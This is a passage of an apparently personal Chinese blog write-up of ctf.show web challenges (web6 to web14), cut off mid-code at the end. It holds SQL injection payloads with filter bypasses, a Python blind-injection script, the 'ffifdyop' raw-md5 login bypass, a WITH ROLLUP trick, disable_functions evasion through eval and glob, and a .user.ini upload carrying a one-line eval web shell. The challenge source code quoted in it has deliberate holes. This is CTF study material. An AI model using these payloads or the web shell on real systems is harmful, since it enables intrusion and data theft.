<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()#&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>得到<code>flag,user</code></p>
<p>查列</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(column_name),3&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;#&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>flag</p>
<p>查flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(flag),3&#x2F;**&#x2F;from&#x2F;**&#x2F;flag#&amp;password&#x3D;</span><br></pre></td></tr></table></figure>

<p>flag 到手~</p>
<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><ul>
<li>fuzz 过滤了<code>+</code> 和空格<code>%20</code> </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?id&#x3D;4&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;4 </span><br></pre></td></tr></table></figure>

<p>4 无回显, 3 有回显</p>
<p>判断回显位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;4&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3</span><br></pre></td></tr></table></figure>

<p>回显位置为2,3</p>
<p>查表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?id&#x3D;4&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;database()),database()</span><br></pre></td></tr></table></figure>

<p>得到flag,page,user</p>
<p>查表列名, 16进制处理一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?id&#x3D;4&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(column_name)from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;0x666c6167),database()</span><br></pre></td></tr></table></figure>

<p>为flag</p>
<p>查flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?id&#x3D;4&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(flag)from&#x2F;**&#x2F;flag),database()</span><br></pre></td></tr></table></figure>

<p>flag到手~</p>
<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>fuzz</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200413114104.png"></p>
<p>过滤了这么些东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and union 单双引号&#39; &quot; 和 逗号, rand 也过滤了这是在提示报错注入?</span><br><span class="line">过滤了逗号, 用()绕过</span><br></pre></td></tr></table></figure>

<ul>
<li>正解是盲注</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 作者: https://blog.csdn.net/weixin_45940434/article/details/104351604</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">&#x27;https://608f92a4-b790-439c-8ab3-57c6fedf40ff.chall.ctf.show/index.php&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">31</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="comment"># 爆表名  flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment"># 爆字段名 flag</span></span><br><span class="line">        <span class="comment"># payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment"># 读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span> % (str(i), str(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += chr(j)</span><br><span class="line">            print(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>一开始以为是爆破, 结果扫目录发现了robots.txt , 得到index.phps</p>
<p>下载下来源码: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(strlen($password)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			<span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">					<span class="keyword">while</span>($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						 <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">						 <span class="keyword">echo</span> $flag;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#39;or&#39;6]!r,b</span><br></pre></td></tr></table></figure>

<p>因为原始字符串中存在 ‘or’ 6 =&gt; true</p>
<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>点击取消, 就是一个下载源码的功能: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params">$strParam</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $regex = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($regex, <span class="string">&quot;&quot;</span>, $strParam); <span class="comment">// 替换为空, 双写绕过即可</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$con) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strlen($username) != strlen(replaceSpecialChar($username))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>); <span class="comment">// 这里是通过长度判断的, 那么双写就绕不过了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strlen($password) != strlen(replaceSpecialChar($password))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">&quot;select * from user where username = &#x27;$username&#x27;&quot;</span>;</span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line"><span class="keyword">if</span> (mysqli_num_rows($result) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysqli_fetch_assoc($result)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($password == $row[<span class="string">&#x27;password&#x27;</span>]) &#123; <span class="comment">// with rollup 绕过</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里可以看到没有password这个数据, 因此直接注释掉即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7th Alternative \s</span><br><span class="line">\s matches any whitespace character (equal to [\r\n\t\f\v ])</span><br></pre></td></tr></table></figure>

<p>但是这里应该是登陆成功就拿flag的, 所以应该不需要什么注入语句的, 构造一个万能密码登陆进去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>发现没用, 直接看hint吧. 这个平台唯一不舒服的就是, 看了hint 会在个人资料上记录….</p>
<p>hint: 1.点取消，得源码 2. 虚拟表绕过</p>
<p>虚拟表绕过? 没听过呢</p>
<p>过滤了<code>,</code> 用<code> limit a offset b</code> 绕过</p>
<blockquote>
<p>SQL查询语句中的 limit 与 offset 的区别：</p>
<p>limit y 分句表示: 读取 y 条数据 //limit 10,就是 从第0个开始，获取10条数据</p>
<p>limit x, y 分句表示: 跳过 x 条数据，读取 y 条数据 //limit 1,2 就是读取2-3条数据, limit 0,1 也就是从1开始读1条数据,即读取1条数据</p>
<p>limit y offset x 分句表示: 跳过 x 条数据，读取 y 条数据 //limit 2 offest 1 就是读取2-3条数据</p>
</blockquote>
<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;password&#x2F;**&#x2F;WITH&#x2F;**&#x2F;ROLLUP&#x2F;**&#x2F;LIMIT&#x2F;**&#x2F;1&#x2F;**&#x2F;OFFSET&#x2F;**&#x2F;1#</span><br></pre></td></tr></table></figure>

<p>前面的<code>&#39;</code> 是闭合作用, 然后用<code>#</code> 注释掉后面的<code>&#39;</code> <code>1=1</code> 是条件为真</p>
<p>offset后面的值需要尝试才能找到pwd是null的行</p>
<p>参考wp : <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45940434/article/details/104351722">https://blog.csdn.net/weixin_45940434/article/details/104351722</a></p>
<blockquote>
<p>首先对post的数据进行了/(select|from|where|join|sleep|and|\s|union|,)/i的过滤，然后查询出来的值要和我们post的password相等</p>
<p>此处使用WITH ROLLUP进行绕过，首先学习一下WITH ROLLUP</p>
<p>WITH ROLLUP是对group by的结果进行进一步的汇总然后显示，在group by 列名 with rollup  中，倘若按列名分组后，列的属性值是不相同的，会生成一条分组条件的列为null的一条新的数据。而如果查询结果是唯一的，一会生成一条分组条件所在列为null的数据。</p>
<p>我们就是要通过with rollup使sql语句查询结果为null，然后不输入password使password为null就可以使password==</p>
<p>password==row[‘password’] (弱比较绕过 空 NULL)</p>
</blockquote>
<p>学习参考: </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44105778/article/details/89163304">https://blog.csdn.net/qq_44105778/article/details/89163304</a></p>
<p><strong>这里要注意一点，当使用rollup的时候就不能使用order by进行排序，换句话说 rollup和order by是相互排斥的。</strong></p>
<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>打开题目就有源码: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params">$strParam</span>)</span>&#123;</span><br><span class="line">             $regex = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> preg_replace($regex,<span class="string">&quot;&quot;</span>,$strParam);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($password==$_SESSION[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很简单的,直接秒, 把session删除, password 置空 即可</p>
<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看注释,发现hint, </p>
<p>传入<code>?cmd=phpinfo();</code>  查看 <code>disable_function</code> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents,file,readfile,opendir,readdir,closedir,rewinddir</span><br></pre></td></tr></table></figure>

<p>几乎没有漏网之鱼, 那么很明显就是去绕过disable_funciton </p>
<p>查看Server API: <code> FPM/FastCGI</code></p>
<p>尝试用插件绕 绕不过, 那就只有看hint了 <strong>glob绕过,highlight看源码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;highlight_file(&#39;index.php&#39;);</span><br></pre></td></tr></table></figure>

<p>得到index.php 源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        $cmd=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($cmd);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>glob() 函数返回匹配指定模式的文件名或目录。</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;var_dump($GLOBALS);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123; [&quot;_GET&quot;]&#x3D;&gt; array(1) &#123; [&quot;cmd&quot;]&#x3D;&gt; string(19) &quot;var_dump($GLOBALS);&quot; &#125; [&quot;_POST&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;cmd&quot;]&#x3D;&gt; string(19) &quot;var_dump($GLOBALS);&quot; [&quot;GLOBALS&quot;]&#x3D;&gt; array(6) &#123; [&quot;_GET&quot;]&#x3D;&gt; array(1) &#123; [&quot;cmd&quot;]&#x3D;&gt; string(19) &quot;var_dump($GLOBALS);&quot; &#125; [&quot;_POST&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_COOKIE&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;cmd&quot;]&#x3D;&gt; string(19) &quot;var_dump($GLOBALS);&quot; [&quot;GLOBALS&quot;]&#x3D;&gt; *RECURSION* &#125; &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd&#x3D;print_r(glob(&quot;*.php&quot;));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?cmd&#x3D;highlight_file(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><ul>
<li>没什么意思, 强行考知识点</li>
<li>修改.user.ini 配置文件 解析php</li>
</ul>
<p>进去是一个文件上传的功能, 试了半天, 上传一个”合格的”文件也没有返回文件路径,那这道题几乎是做不出来了</p>
<p>看了下wp, 要源码泄露? <code>upload.php.bak</code> wdnmd  这扫不到的,看来得找一下更强大的扫描器了</p>
<blockquote>
<p>这里列举一下常见的源码泄露<br>.hg源码泄漏 .git源码泄漏 .DS_Store文件泄漏，还有以.phps .bak结尾的网页<br>在web题没有头绪的时候可以尝试可能会有奇效。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	$filename = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	$temp_name = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	$size = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	$error = $_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	$arr = pathinfo($filename);</span><br><span class="line">	$ext_suffix = $arr[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> ($size &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (strlen($filename)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(strlen($ext_suffix)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,$ext_suffix))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>),$filename))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (move_uploaded_file($temp_name, <span class="string">&#x27;./&#x27;</span>.$filename))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里只对文件的外表进行了处理,没有对文件的内容处理, 这里没有对文件后缀为php 的做了限制, 没有对<code>.htaccess</code> 和<code>.user.ini</code> 但是对文件名的长度做了限制, 故我们上传后者, 让其解析其他文件为php文件即可, 注意限制文件的大小</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200413175727.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200413175901.png"></p>
<p>当然可以在网页上直接做</p>
<p>post: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x3D;print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x3D;highlight_file(&#39;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&#39;);</span><br></pre></td></tr></table></figure>

<p>getflag</p>
<blockquote>
<p>解决go make timeout</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export all_proxy&#x3D;http:&#x2F;&#x2F;127.0.0.1:7890 ✖</span><br><span class="line">$env:GOPROXY &#x3D; &quot;https:&#x2F;&#x2F;goproxy.io&quot; ✔ powershell中运行</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200413193405.png"></p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = intval($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    sleep($c);</span><br><span class="line">    <span class="keyword">switch</span> ($c) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> $url;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span 